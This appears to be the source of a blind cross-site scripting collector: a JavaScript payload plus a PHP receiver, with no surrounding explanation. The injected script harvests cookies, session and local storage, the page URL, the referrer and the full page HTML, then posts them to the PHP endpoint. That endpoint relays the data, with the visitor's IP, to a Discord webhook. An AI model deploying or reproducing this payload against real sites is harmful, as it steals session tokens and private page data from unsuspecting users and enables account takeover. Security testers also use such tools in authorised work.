var mailer = '<?php echo "//" . $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"] ?>';

var msg = 'USER AGENT\\n' + navigator.userAgent + '\\n\\nTARGET URL\\n' + document.URL;
msg += '\\n\\nREFERRER URL\\n' + document.referrer + '\\n\\nREADABLE COOKIES\\n' + document.cookie;
msg += '\\n\\nSESSION STORAGE\\n' + JSON.stringify(sessionStorage) + '\\n\\nLOCAL STORAGE\\n' + JSON.stringify(localStorage);
msg += '\\n\\nFULL DOCUMENT\\n' + document.documentElement.innerHTML;

var r = new XMLHttpRequest();
r.open('POST', mailer, true);
r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
r.send('origin=' + document.location.origin + '&msg=' + encodeURIComponent(msg));

<?php

if (!isset($_POST["origin"]))
    $_POST["origin"] = "";

if (!isset($_SERVER["REMOTE_ADDR"]))
    $_SERVER["REMOTE_ADDR"] = "";

if (!isset($_SERVER["HTTP_X_FORWARDED_FOR"]))
    $_SERVER["HTTP_X_FORWARDED_FOR"] = "";

if (!isset($_POST["msg"]))
    $_POST["msg"] = "";

header("Access-Control-Allow-Origin: " . $_POST["origin"]);

$origin = $_POST["origin"];
$subject = "XSS Blind Report for " . $origin;
$ip = "Requester: " . $_SERVER["REMOTE_ADDR"] . "\\nForwarded For: " . $_SERVER["HTTP_X_FORWARDED_FOR"];
$msg = $subject . "\\n\\nIP ADDRESS\\n" . $ip . "\\n\\n" . $_POST["msg"];

if ($origin && $msg) {

    $url = "https://discord_WEBHOK";
    if (strlen($msg) <= 1500) {
        $ch = curl_init($url);
        # Setup request to send json via POST.
        $payload = json_encode(array("content" => $msg));
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
        # Return response instead of printing.
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        # Send request.
        $result = curl_exec($ch);
        curl_close($ch);
        # Print response.
        # echo "<pre>$result</pre>";
    } else {
        $msgParts = str_split($msg, 1500);
        $Parts = 0;
        foreach ($msgParts as $msgPart) {
            $Parts++;
            $msg = "Part $Parts: \\n" . $msgPart;
            $ch = curl_init($url);
            # Setup request to send json via POST.
            $payload = json_encode(array("content" => $msg));
            curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
            # Return response instead of printing.
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            # Send request.
            $result = curl_exec($ch);
            curl_close($ch);
            # Print response.
            # echo "<pre>$result</pre>";
        }
    }
}